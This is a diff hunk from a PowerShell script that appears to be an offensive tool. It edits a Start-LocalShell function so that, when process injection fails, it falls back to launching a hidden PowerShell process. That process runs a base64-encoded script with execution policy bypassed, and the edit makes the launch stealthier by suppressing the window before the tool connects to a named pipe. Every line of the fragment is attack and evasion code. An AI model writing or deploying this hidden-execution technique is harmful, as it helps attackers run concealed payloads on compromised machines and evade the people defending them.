@@ -2530,7 +2530,10 @@ function Start-LocalShell {
                 Write-Host " [!] Injection failed (no SeDebugPrivilege?) — spawning hidden PS process instead." -ForegroundColor Yellow
                 try {
                     $b64enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($built.RawScript))
-                    Start-Process powershell.exe -ArgumentList @('-ep','bypass','-nop','-w','hidden','-enc',$b64enc) -WindowStyle Hidden
+                    $psi_mg = New-Object System.Diagnostics.ProcessStartInfo('powershell.exe', "-ep bypass -nop -w hidden -enc $b64enc")
+                    $psi_mg.CreateNoWindow = $true
+                    $psi_mg.UseShellExecute = $false
+                    [System.Diagnostics.Process]::Start($psi_mg) | Out-Null
                 } catch { Write-Host " [!] Spawn failed: $($_.Exception.Message)" -ForegroundColor Red }
             }
             Write-Host " [+] Connecting to pipe $PN (15s timeout)..." -ForegroundColor Green
